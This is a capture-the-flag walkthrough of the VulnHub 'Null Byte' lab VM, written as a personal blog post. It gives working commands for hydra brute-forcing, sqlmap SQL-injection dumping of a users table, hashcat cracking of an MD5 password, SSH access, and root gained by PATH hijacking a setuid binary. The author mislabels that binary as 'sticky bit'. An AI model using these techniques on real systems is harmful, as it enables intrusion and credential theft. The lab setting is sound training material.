---
title: "VulnHub - Null Byte Walkthrough"
date: 2020-10-02
tags: [vulnhub, walkthrough, linux]
header:
  image: "/images/nullbyte-thumbnail.jpg"
excerpt: "Walkthroughs"
---

# VulnHub- Null Byte Walkthrough

Hello, everyone. Today I will share the Boot to Root process in Null Byte vulnerable machine. I will share only the successful way. There will not a lot of information.

## Information Gathering

We are starting with a **Nmap scan** to find open ports and services.

```
root@kali:~/NullByte# nmap -p- -T4 -A nullbyte.local  
...  
PORT STATE SERVICE VERSION  
80/tcp open http Apache httpd 2.4.10 ((Debian))  
|_http-server-header: Apache/2.4.10 (Debian)  
|_http-title: Null Byte 00 - level 1  
111/tcp open rpcbind 2-4 (RPC #100000)  
777/tcp open ssh OpenSSH 6.7p1 Debian 5 (protocol 2.0)   
37639/tcp open status 1 (RPC #100024)  
```

There is nothing valuable in **Nikto** scanning.

There is nothing valuable in **dirb** scanning.

## Enumeration

I googled about "What is the laws of harmony?", but I can't find a lot of information. 

Then I downloaded the only picture in the website. After that, I read metadata of the .gif file using **exiftool**.
```
root@kali:~/NullByte# exiftool main.gif  
...
Comment : P-): kzMb5nVYJw  
...
```

I try to decode Comment in ROT, BASE64 but it didn't give any information.

I go to this directory from Firefox.

When I try to read the Page source I saw something like this:

*<!-- this form isn't connected to mysql, password ain't that complex --!>*

And it can be a hint that this page will take us to MySQL or something like this, but there is one little problem. Our page want a passphrase from us to go to the next page.

I try to **hydra** bruteforce attack to find the exact passphrase.
```
root@kali:~/NullByte# hydra nullbyte.local http-form-post "/kzMb5nVYJw/index.php:key=^USER^:invalid key" -L rockyou.txt -p '' -t 50 -f  
... 
[80][http-post-form] host: nullbyte.local login: elite  
...
```

 - **-L**: username list
 - **-p**: password list
 - **-t**: the number of thread
 - **-f**: force


Our correct passhrase is "elite". We type it and the page opened.
I viewed the source code of the page.
```
<p>Search for usernames: </p>  
<hr>  
<form action="[420search.php](http://view-source:http://nullbyte.local/kzMb5nVYJw/420search.php)" method="get">  
Enter username:<br>  
<input type="text" name="usrtosearch">  
</form>
```

There is one interesting file - "420search.php". I move on this file. That is amazing there are names of the users.
```
EMP ID :1 <br> EMP NAME : ramses 
<br> EMP POSITION : 
<br>
--------------------------------
<br>
EMP ID :2 <br> EMP NAME : isis 
<br> 
EMP POSITION : employee 
<br> 
--------------------------------
<br>
Fetched data successfully
```
This was be a PHP code. It returns empty Employee position when we type ramses, employee as Employee position in isis and "Fetched data successfully." in all other variants.
When we check this input field, we see that it is connected to the MySQL database.
Now we will try to dump all the information from the database using **sqlmap**.

Firstly, we try to find *table name*.
```
root@kali:~/NullByte# sqlmap -u http://nullbyte.local/kzMb5nVYJw/420search.php?usrtosearch=ramses --dbs  
...
available databases [5]:  
[*] information_schema  
[*] mysql  
[*] performance_schema  
[*] phpmyadmin  
[*] seth  
...
```
There are five available databases, but four of them is created by default.

Now, we now our database name, so we pass to the next step.

We will enumerate table inside seth database.
```
root@kali:~/NullByte# sqlmap -u http://nullbyte.local/kzMb5nVYJw/420search.php?usrtosearch=ramses -D seth --tables  
...  
Database: seth  
[1 table]  
+-------+  
| users |  
+-------+  
...
```
There is a single table. It is users table.
After that, we will the columns in this table.
```
root@kali:~/NullByte# sqlmap -u http://nullbyte.local/kzMb5nVYJw/420search.php?usrtosearch=ramses -D seth -T users --columns  
...  
Database: seth  
Table: users  
[4 columns]  
+----------+-------------+  
| Column | Type |  
+----------+-------------+  
| position | text |  
| user | text |  
| id | smallint(6) |  
| pass | text |  
+----------+-------------+  
...
```
Okay, almost everything is clear for us. There is small touch only.
As a final step we dump the users.
```
root@kali:~/NullByte# sqlmap -u http://nullbyte.local/kzMb5nVYJw/420search.php?usrtosearch=ramses -D seth -T users -C id,users,pass -dump  
...  
Database: seth  
Table: users  
[2 entries]  
+----+-------+---------------------------------------------+  
| id | users | pass |  
+----+-------+---------------------------------------------+  
| 1 | ramses | YzZkNmJkN2ViZjgwNmY0M2M3NmFjYzM2ODE3MDNiODE |  
| 2 | isis   | --not allowed-- |  
+----+-------+---------------------------------------------+  
...
```

## Exploit
And it is exciting part of the game.
We will log into *ramses*.

We **decode BASE64**.
```
root@kali:~/NullByte# echo "YzZkNmJkN2ViZjgwNmY0M2M3NmFjYzM2ODE3MDNiODE=" | base64 -d  
c6d6bd7ebf806f43c76acc3681703b81
```

We crack **MD5 hash**.
```
root@kali:~/NullByte# echo "c6d6bd7ebf806f43c76acc3681703b81" > hash.txt
root@kali:~/NullByte# hashcat -m 0 -a 0 hash.txt rockyou.txt
```
Our password is *omega* 
Note: You can use **CrackStation** also.

Then we connect to our victim via SSH.
```
root@kali:~/NullByte# ssh ssh://ramses@nullbyte.local:777  
...
ramses@NullByte:~$
```

## Privilege Escalation
In this part of the game, we will find some vulnerability to gain root access.
I try to read **.bash_history** file. It is crucial step during Privilege Escalation.
```
ramses@NullByte:~$ ls /home/  
bob eric ramses  
ramses@NullByte:~$ ls -la  
total 24  
drwxr-xr-x 2 ramses ramses 4096 Aug 2 2015 .  
drwxr-xr-x 5 root root 4096 Aug 2 2015 ..  
-rw------- 1 ramses ramses 96 Aug 2 2015 .bash_history  
-rw-r--r-- 1 ramses ramses 220 Aug 2 2015 .bash_logout  
-rw-r--r-- 1 ramses ramses 3515 Aug 2 2015 .bashrc  
-rw-r--r-- 1 ramses ramses 675 Aug 2 2015 .profile   
ramses@NullByte:~$ cat .bash_history  
sudo -s  
su eric  
exit  
ls  
clear  
cd /var/www  
cd backup/  
ls  
./procwatch  
clear  
sudo -s  
cd /  
ls  
exit   
```
There is one interesting directory - */var/www*. I move on this directory.
```
ramses@NullByte:~$ cd /var/www/  
ramses@NullByte:/var/www$ ls  
backup html  
ramses@NullByte:/var/www$ cd backup/  
ramses@NullByte:/var/www/backup$ ls  
procwatch readme.txt  
ramses@NullByte:/var/www/backup$ cat readme.txt  
I have to fix this mess...
```

There is nothing valuable in th *readme.txt* file.
I try to run *procwatch* binary. It opens the same STDOUT like *ps* command in the linux. Also if we pay attention to the file permissions there is **Sticky Bit** in this file. It means that we will need to gain root privileges using **Sticky Bit**.
```
ramses@NullByte:/var/www/backup$ ln -s /bin/sh ps  
ramses@NullByte:/var/www/backup$ ls  
procwatch ps readme.txt  
ramses@NullByte:/var/www/backup$ export PATH=.:$PATH  
ramses@NullByte:/var/www/backup$ ./procwatch  
# whoami  
root  
# cat /root/proof.txt  
adf11c7a9e6523e630aaf3b9b7acb51d  
  
It seems that you have pwned the box, congrats.  
Now you done that I wanna talk with you. Write a walk & mail at  
xly0n@sigaint.org attach the walk and proof.txt  
If sigaint.org is down you may mail at nbsly0n@gmail.com  
  
  
USE THIS PGP PUBLIC KEY  
  
-----BEGIN PGP PUBLIC KEY BLOCK-----  
Version: BCPG C# v1.6.1.0  
  
mQENBFW9BX8BCACVNFJtV4KeFa/TgJZgNefJQ+fD1+LNEGnv5rw3uSV+jWigpxrJ  
Q3tO375S1KRrYxhHjEh0HKwTBCIopIcRFFRy1Qg9uW7cxYnTlDTp9QERuQ7hQOFT  
e4QU3gZPd/VibPhzbJC/pdbDpuxqU8iKxqQr0VmTX6wIGwN8GlrnKr1/xhSRTprq  
Cu7OyNC8+HKu/NpJ7j8mxDTLrvoD+hD21usssThXgZJ5a31iMWj4i0WUEKFN22KK  
+z9pmlOJ5Xfhc2xx+WHtST53Ewk8D+Hjn+mh4s9/pjppdpMFUhr1poXPsI2HTWNe  
YcvzcQHwzXj6hvtcXlJj+yzM2iEuRdIJ1r41ABEBAAG0EW5ic2x5MG5AZ21haWwu  
Y29tiQEcBBABAgAGBQJVvQV/AAoJENDZ4VE7RHERJVkH/RUeh6qn116Lf5mAScNS  
HhWTUulxIllPmnOPxB9/yk0j6fvWE9dDtcS9eFgKCthUQts7OFPhc3ilbYA2Fz7q  
m7iAe97aW8pz3AeD6f6MX53Un70B3Z8yJFQbdusbQa1+MI2CCJL44Q/J5654vIGn  
XQk6Oc7xWEgxLH+IjNQgh6V+MTce8fOp2SEVPcMZZuz2+XI9nrCV1dfAcwJJyF58  
kjxYRRryD57olIyb9GsQgZkvPjHCg5JMdzQqOBoJZFPw/nNCEwQexWrgW7bqL/N8  
TM2C0X57+ok7eqj8gUEuX/6FxBtYPpqUIaRT9kdeJPYHsiLJlZcXM0HZrPVvt1HU  
Gms=  
=PiAQ  
-----END PGP PUBLIC KEY BLOCK-----  
  
#
```

In this point can be a little confusing.

 1. Firstly, we create Soft Link to **/bin/sh** as the name of **ps**.
 2. Then I change the $PATH file, because when we run the *procwatch* it will search for *ps* command using $PATH file. We say that the first place to looking for finding commands is our *current directory* (dot means that).
 3. When we run *procwatch* it will look for current directory run *ps* soft link and it triggered system shell.

Bingo! Thanks for reading!





## Additional
It can be much better to dump all the information from the database manually.